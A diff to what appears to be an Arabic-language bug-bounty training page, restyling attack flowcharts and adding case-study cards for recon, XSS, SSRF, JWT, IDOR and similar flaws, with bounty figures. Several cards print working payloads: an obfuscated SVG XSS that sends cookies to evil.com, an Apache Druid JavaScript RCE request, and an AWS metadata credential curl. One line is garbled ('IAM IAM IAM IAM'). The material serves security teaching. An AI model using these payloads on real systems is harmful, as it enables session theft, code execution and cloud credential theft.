@@ -337,46 +337,52 @@
     /* Attack Flow Diagram Visualization */
     .flow-visualization {
       display: flex;
-      flex-direction: column;
+      flex-direction: row;
       align-items: center;
-      gap: 12px;
-      padding: 25px;
+      gap: 15px;
+      padding: 30px 20px;
       background: #030308;
-      border: 1px dashed rgba(0, 229, 255, 0.15);
+      border: 1px solid rgba(0, 229, 255, 0.12);
       border-radius: 8px;
       margin: 20px 0;
+      overflow-x: auto;
+      white-space: nowrap;
+      box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.8);
     }
     .flow-node {
       background: rgba(8, 8, 16, 0.9);
       border: 1px solid rgba(0, 229, 255, 0.2);
-      border-radius: 6px;
-      padding: 12px 24px;
-      min-width: 250px;
+      border-radius: 8px;
+      padding: 15px 22px;
+      min-width: 170px;
       text-align: center;
       font-family: 'Outfit', sans-serif;
       font-weight: 700;
       color: #fff;
-      box-shadow: 0 0 15px rgba(0, 229, 255, 0.05);
-      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       cursor: pointer;
-      font-size: 1.2rem;
+      font-size: 1.15rem;
       position: relative;
+      flex-shrink: 0;
     }
     .flow-node:hover {
-      transform: scale(1.03);
+      transform: translateY(-4px);
       border-color: var(--neon-cyan);
-      box-shadow: 0 0 20px rgba(0, 229, 255, 0.2);
+      box-shadow: 0 0 20px rgba(0, 229, 255, 0.25);
     }
     .flow-node.active-stage {
-      background: rgba(0, 229, 255, 0.1);
+      background: linear-gradient(135deg, rgba(0, 229, 255, 0.15), rgba(155, 89, 255, 0.15));
       border-color: var(--neon-cyan);
-      box-shadow: 0 0 25px rgba(0, 229, 255, 0.3);
-      color: var(--neon-cyan);
+      box-shadow: 0 0 25px rgba(0, 229, 255, 0.35);
+      color: #fff;
     }
     .flow-arrow {
-      color: rgba(0, 229, 255, 0.4);
+      color: var(--neon-cyan);
       font-size: 1.4rem;
       animation: pulse 1.5s infinite;
+      text-shadow: 0 0 8px rgba(0, 229, 255, 0.4);
+      flex-shrink: 0;
     }
 
     .workflow-tree {
@@ -788,17 +794,17 @@
           <div class="card-header"><h3>🗺️ Recon Workflow Flowchart</h3></div>
           <div class="flow-visualization">
             <div class="flow-node active-stage" onclick="inspectNode('Subfinder', 'أداة استعلام سريعة تعتمد على APIs سلبية ومصادر أرشيفية خارجية.')">Subfinder</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('Amass', 'أداة رسم خرائط OSINT عميقة للبحث والتحقق من النطاقات.')">Amass</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('httpx', 'التحقق من الخوادم النشطة المستجيبة بروتوكولياً وتصفية المواقع المغلقة.')">httpx</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('Naabu', 'فحص المنافذ المفتوحة على الخوادم النشطة بسرعة فائقة.')">Naabu</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('Nmap', 'تحديد إصدارات الخدمات وأنظمة التشغيل بدقة وعمق.')">Nmap</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('Katana', 'زاحف ويب متطور لاستخراج مسارات الملفات والصفحات.')">Katana</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('Nuclei', 'فحص الثغرات الأمنية التلقائي باستخدام قوالب مجتمعية محدثة.')">Nuclei</div>
           </div>
           <div id="recon-inspector" class="node-inspector">
@@ -828,6 +834,16 @@ httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Starbucks Subdomain Takeover</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تم العثور على نطاق فرعي نشط لشركة Starbucks يشير إلى خادم Azure سحابي تم حذفه مسبقاً.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> قام الباحث بتسجيل خادم Azure بنفس المعرف، مما مكنه من توجيه حركة المرور وسرقة التوكنز الخاصة بزبائن التطبيق.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">host starbucks-api.azurewebsites.net
+# Returns NXDOMAIN (Alias pointing to unclaimed resources)</div>
+          </div>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 2: Tech Detection -->
@@ -845,6 +861,18 @@ httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt</div>
               <button class="cmd-btn" onclick="copyText('whatweb --input-file=alive.txt --aggression=3 -v --color=never -o whatweb_results.txt', this)">📋 Copy</button>
             </div>
           </div>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Apache Druid stack profiling</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تحديد إصدار لوحة تحكم Apache Druid قديمة خلال فحص بصمات التقنيات السيرفر.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> رصد الباحث إصداراً مصاباً بثغرة RCE (CVE-2021-27651) واستخدم حمولة JSON لتنفيذ الأوامر.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">POST /druid/indexer/v1/sampler HTTP/1.1
+Content-Type: application/json
+
+{"type":"index","spec":{"dataSchema":{"parser":{"parseSpec":{"format":"javascript","tsColName":"timestamp","timestampSpec":{"column":"timestamp","format":"auto"},"dimensionsSpec":{},"function":"function(){java.lang.Runtime.getRuntime().exec('id')}"}}}}}</div>
+          </div>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$10,000</span></p>
         </div>
       </div>
 
@@ -898,6 +926,12 @@ nmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt</di
               <button class="cmd-btn" onclick="copyText('naabu -list alive.txt -p - -silent -o ports.txt\nnmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt', this)">📋 Copy</button>
             </div>
           </div>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Unauthenticated Kibana dashboard</h3></div>
+          <p><strong>الوصف (Scenario):</strong> فحص منافذ السيرفر كشف عن المنفذ 5601 الخاص بـ Kibana مفتوحاً للعامة دون توثيق.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> الدخول مباشرة للوحة التحكم وقراءة قواعد البيانات والـ Elasticsearch وسحب بيانات المستخدمين.</p>
+          <p><strong>الأثر (Impact):</strong> تسريب بيانات ملايين العملاء لشركة شحن معروفة.</p>
         </div>
       </div>
 
@@ -958,6 +992,12 @@ nmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt</di
               </tr>
             </tbody>
           </table>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: GitLab server mapping RCE</h3></div>
+          <p><strong>الوصف (Scenario):</strong> اكتشاف خادم GitLab داخلي خلال فحص النطاقات الفرعية وتطبيق مصفوفة الاستجابة للثغرات المعروفة.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> تم استغلال ثغرة رفع الملفات وتمرير حمولات لملفات صور معطوبة لتنفيذ الأوامر (CVE-2021-22205).</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$5,000</span></p>
         </div>
       </div>
 
@@ -1069,6 +1109,17 @@ nmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt</di
             <li>✔ <code>.env / .log / .sql</code> — سجلات التكوين والبيانات الحساسة.</li>
           </ul>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Exposed .git directory</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تخمين المسارات المخفية كشف عن مجلد .git مفتوحاً بالكامل للتحميل على موقع حكومي حساس.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> قام المهاجم بتحميل كامل الشيفرة المصدرية للموقع ومراجعتها محلياً واستخراج كلمات مرور قواعد البيانات.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">wget --mirror --no-parent http://target.com/.git/
+# Reconstructing repository
+git status</div>
+          </div>
+          <p><strong>الأثر (Impact):</strong> السيطرة الكاملة على السيرفر والبيانات.</p>
+        </div>
       </div>
 
       <!-- Phase 4: JavaScript Recon -->
@@ -1082,15 +1133,15 @@ nmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt</di
           <div class="card-header"><h3>🗺️ JS Recon Attack Flowchart (انقر على الخطوة للتفاصيل)</h3></div>
           <div class="flow-visualization">
             <div class="flow-node active-stage" onclick="inspectNode('JS Step 1: Collect JS Files', 'استخلاص ملفات الـ JS بنطاقات الخادم النشطة والمؤرشفة.')">1. Collect JS</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JS Step 2: Beautify JS minified files', 'تنسيق الملفات البرمجية المضغوطة لتسهيل فك الشيفرة وقراءتها.')">2. Beautify JS</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JS Step 3: Extract Endpoints', 'استخراج روابط API والمنافذ المخفية باستخدام تعابير ريجكس ولينك فايندر.')">3. Extract Endpoints</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JS Step 4: Extract Secrets', 'فحص الملفات بحثاً عن مفاتيح سحابية وتوكنز (AWS, Firebase, PATs) مسربة.')">4. Extract Secrets</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JS Step 5: Analyze APIs structure', 'رسم خريطة للـ endpoints والميثودز المقترنة بها (GET, POST, PUT).')">5. Analyze APIs</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JS Step 6: Test Hidden Features', 'البحث عن معلمات برمجية سرية (مثل debug=true) لتخطي الصلاحيات.')">6. Hidden Features</div>
           </div>
           
@@ -1175,6 +1226,17 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Hardcoded AWS S3 credentials</h3></div>
+          <p><strong>الوصف (Scenario):</strong> مراجعة الأسرار داخل ملفات الجافا سكربت كشفت عن مفاتيح AWS IAM IAM IAM IAM مسربة داخل ملف main.js.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> استخدام الأدوات الرسمية للوصول لملفات النسخ الاحتياطي الخاصة بالخوادم.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+aws s3 ls</div>
+          </div>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$5,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 16: API Testing Workflow -->
@@ -1239,6 +1301,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Uber API BOLA/IDOR</h3></div>
+          <p><strong>الوصف (Scenario):</strong> رصد مسار API للهاتف المحمول غير محمي بشكل كافٍ ضد تعديل معرفات المستخدمين.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> بتعديل المعرف UUID بالطلب إلى حساب آخر، استطاع المهاجم جلب تفاصيل رحلات ومواقع الزبائن بالكامل.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$10,000</span></p>
+        </div>
       </div>
 
       <!-- Phase GraphQL Hacking -->
@@ -1252,13 +1320,13 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
           <div class="card-header"><h3>🗺️ GraphQL Attack Stages (منهجية الفحص التدريجي)</h3></div>
           <div class="flow-visualization">
             <div class="flow-node active-stage" onclick="inspectNode('GraphQL Step 1: Schema Discovery', 'البحث عن مسار GraphQL الافتراضي ورسم خريطة بالـ Types والـ Queries.')">Schema Discovery</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('GraphQL Step 2: Introspection', 'إرسال طلب Introspection Query لسحب المخطط البرمجي الداخلي بالكامل.')">Introspection Query</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('GraphQL Step 3: Query Abuse', 'استغلال الاستعلامات الدائرية المتداخلة لإحداث شلل تام بالخادم (DoS).')">Query Abuse (DoS)</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('GraphQL Step 4: IDOR testing', 'اختبار الصلاحيات عبر استعلام معرفات الكيانات مباشرة دون مصادقة خلف الم resolvers.')">IDOR inside Queries</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('GraphQL Step 5: Batch Attacks', 'إرسال استعلامات برمجية متعددة في طلب HTTP واحد لتخطي جدر الحماية والـ Rate Limit.')">Batch Attacks</div>
           </div>
           
@@ -1351,6 +1419,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Shopify GraphQL query batching</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تخطي جدار الحماية ضد التخمين والتكرار باستغلال خاصية الدفعات في GraphQL.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> دمج الباحث 500 محاولة لتخمين الرموز السرية داخل طلب HTTP واحد، متخطياً الـ Rate Limiter.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 5: Parameters Discovery -->
@@ -1370,6 +1444,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Payment verification bypass parameter</h3></div>
+          <p><strong>الوصف (Scenario):</strong> فحص البارامترات الموجهة لبوابات الدفع كشف عن معامل خفي باسم amount أو bypass.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> حقن المعامل <code>?bypass=true</code> أو تغيير القيمة البرمجية إلى <code>0</code> لتنفيذ عمليات الشراء مجاناً.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,500</span></p>
+        </div>
       </div>
 
       <!-- Phase 3: Crawling & Spidering -->
@@ -1388,6 +1468,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
               <button class="cmd-btn run-btn" onclick="triggerTerminalSim('katana -u target.com')">▶ Run Simulator</button>
             </div>
           </div>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Discovered backup route on crawled paths</h3></div>
+          <p><strong>الوصف (Scenario):</strong> زحف ويب تفصيلي عبر Katana كشف عن مسار قديم ملغي يضم نسخة احتياطية من ملفات المستخدمين.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> تحميل الملف وقراءة بيانات وجداول التوثيق كاملة.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$1,500</span></p>
         </div>
       </div>
 
@@ -1436,6 +1522,15 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </tbody>
           </table>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Cloudflare WAF bypass on financial forum</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تخطي جدار الحماية لتمرير حمولة XSS ناجحة لسرقة الكوكيز الخاصة بمدير المنتدى.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> استخدام وسم SVG مع تفاعل مباشر لا يتطلب وسم script لحقن كود السرقة.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">&lt;svg onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9ldmlsLmNvbS8nK2RvY3VtZW50LmNvb2tpZSk='))&gt;</div>
+          </div>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 8: SQLi Workflow -->
@@ -1462,6 +1557,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             <li>✔ <strong>Blind Time-Based:</strong> التحقق عبر إحداث تأخير زمني <code>SLEEP(5)</code>.</li>
           </ul>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Union SQLi on SaaS checkout gateway</h3></div>
+          <p><strong>الوصف (Scenario):</strong> رصد استعلام غير محمي في صفحة فواتير الدفع لمتجر الكتروني كبير.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> حقن استعلام UNION وسحب معلومات وبيانات الإدارة كاملة.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$8,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 9: SSRF Workflow -->
@@ -1478,6 +1579,15 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             <li>✔ <strong>Detection:</strong> حقن رابط خادم خارجي مثل Interact.sh أو رابط داخلي <code>http://127.0.0.1:80/</code>.</li>
             <li>✔ <strong>Metadata targets:</strong> استدعاء روابط السحابة العامة مثل AWS <code>http://169.254.169.254/latest/meta-data/</code>.</li>
           </ul>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Capital One AWS SSRF leak</h3></div>
+          <p><strong>الوصف (Scenario):</strong> اختراق بنك Capital One الشهير عبر استغلال ثغرة SSRF على الـ WAF لقراءة خادم الميتاداتا.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> استدعاء رابط الميتاداتا لجلب مفاتيح إدارة الهوية السحابية (IAM Credentials) وسحب بيانات 100 مليون عميل.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</div>
+          </div>
+          <p><strong>الأثر (Impact):</strong> تسوية قضائية بقيمة 250 مليون دولار.</p>
         </div>
       </div>
 
@@ -1531,6 +1641,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </tbody>
           </table>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Flask profile name SSTI RCE</h3></div>
+          <p><strong>الوصف (Scenario):</strong> حقن العمليات الرياضية في خانة الاسم الشخصي للمستخدم في تطبيق مصمم بـ Flask.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> انعكاس الاسم بالنتيجة الحسابية 49، ثم تحويل الحمولة لاستدعاء كيانات بايثون العامة لتنفيذ الأوامر.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,000</span></p>
+        </div>
       </div>
 
       <!-- Phase XXE Injection -->
@@ -1554,6 +1670,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: File read via XML Invoice parse</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تطبيق محاسبي يسمح للمستخدم برفع فواتير بصيغة XML لمعالجتها واستخراج الإجمالي.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> تعديل ملف الـ XML لحقن كيان خارجي (External Entity) يشير لملفات النظام وعرض محتواها بالصفحة.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 10: IDOR Testing -->
@@ -1566,6 +1688,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
         <div class="cyber-card">
           <div class="card-header"><h3>💡 Testing Strategy</h3></div>
           <blockquote class="mindset-quote">"قم بالتسجيل بحسابين مختلفين (A & B). استخرج طلب حساب A من Burp Suite، وقم بتعديل الـ ID أو اسم المستخدم إلى حساب B. إذا تم تنفيذ الطلب، فهناك ثغرة IDOR مؤكدة."</blockquote>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Order Management BOLA/IDOR</h3></div>
+          <p><strong>الوصف (Scenario):</strong> التعديل على المعرف الرقمي للفاتورة في بوابة العميل في نظام إدارة الخدمات اللوجستية.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> تغيير المعرف من 101 لـ 102 وقراءة بيانات ومواقع شحنات زبائن آخرين.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,500</span></p>
         </div>
       </div>
 
@@ -1585,6 +1713,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
             <li>✔ <strong>MIME-Type bypass:</strong> تعديل الـ Content-Type في الطلب إلى <code>image/jpeg</code> بدلاً من <code>application/x-php</code>.</li>
           </ul>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: PHP Webshell upload via extension bypass</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تطبيق يسمح للمستخدم برفع صورته الشخصية لكنه لا يعقم الملفات المرفوعة بشكل كافٍ.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> تغيير امتداد الملف لـ <code>.phtml</code> وتعديل الـ Content-Type إلى <code>image/png</code> لتنفيذ أوامر النظام RCE.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,500</span></p>
+        </div>
       </div>
 
       <!-- Phase 12: Race Conditions -->
@@ -1597,6 +1731,12 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
         <div class="cyber-card">
           <div class="card-header"><h3>⚙️ Multi-request attack scenario</h3></div>
           <p>إرسال طلبات متزامنة بكوبونات الخصم أو سحب المبالغ المالية بأجزاء من المايكروثانية باستخدام Burp Suite Turbo Intruder.</p>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Shopify double coupon discount</h3></div>
+          <p><strong>الوصف (Scenario):</strong> التلاعب بالعمليات المتزامنة لاستخدام كوبون خصم وحيد الاستعمال عدة مرات.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> إرسال 50 طلباً متزامناً بالمايكروثانية باستخدام Burp Suite Turbo Intruder، مما جعل قاعدة البيانات تقبل الكود مكرراً.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,000</span></p>
         </div>
       </div>
 
@@ -1611,15 +1751,15 @@ grep -oE "(?:\"|\')(?:\/[\w\d\-\/\.\?=\&]+)(?:\"|\')" file.js</div>
           <div class="card-header"><h3>🗺️ JWT Attack Pipeline Flowchart (انقر للتفاصيل)</h3></div>
           <div class="flow-visualization">
             <div class="flow-node active-stage" onclick="inspectNode('JWT Step 1: Decode Token', 'فك ترميز التوكن (Base64) لمراجعة البيانات والـ claims والخورازمية.')">1. Decode Token</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JWT Step 2: Analyze Algorithm', 'تحديد نوع خوارزمية التشفير المستخدمة وثقة الخادم بها.')">2. Analyze Algorithm</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JWT Step 3: Weak Secret Cracking', 'التخمين على المفتاح السري محلياً إذا كان ضعيفاً باستخدام Hashcat.')">3. Weak Secret</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JWT Step 4: None Algorithm Bypass', 'تغيير خوارزمية التشفير بالهيدر إلى none وحذف التوقيع بالكامل.')">4. None Algorithm</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JWT Step 5: Key Confusion Attack', 'التلاعب بـ RS256 العام للتوقيع كـ HS256 متماثل باستخدام المفتاح العام.')">5. Key Confusion</div>
-            <div class="flow-arrow">▼</div>
+            <div class="flow-arrow">➔</div>
             <div class="flow-node" onclick="inspectNode('JWT Step 6: Expired Token Bypass', 'التعديل على حقل exp لطلب تخطي انتهاء صلاحية التوكن القديم.')">6. Expired Bypass</div>
           </div>
           
@@ -1670,6 +1810,12 @@ jwt_tool jwt_token.txt -C -d rockyou.txt</div>
             </div>
           </div>
         </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: JWT RS256 to HS256 Key Confusion</h3></div>
+          <p><strong>الوصف (Scenario):</strong> فك التحقق من التوكن بتغيير الخوارزمية لـ HS256 مستخدماً المفتاح العام للولوج التلقائي.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> قام المهاجم بجلب المفتاح العام وتعديل الهيدر ليصبح HS256 والتوقيع به، مما أدى لدخوله كمدير للنظام.</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$5,000</span></p>
+        </div>
       </div>
 
       <!-- Phase 13: OAuth & Sessions -->
@@ -1682,6 +1828,12 @@ jwt_tool jwt_token.txt -C -d rockyou.txt</div>
         <div class="cyber-card">
           <div class="card-header"><h3>🛡️ OAuth redirects issues</h3></div>
           <p>التعديل على بارامتر <code>redirect_uri</code> لإرسال رمز التفويض (Authorization Code) إلى موقع خارجي يملكه المهاجم وسرقة حساب المستخدم.</p>
+        </div>
+      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: OAuth Redirect URI Hijack</h3></div>
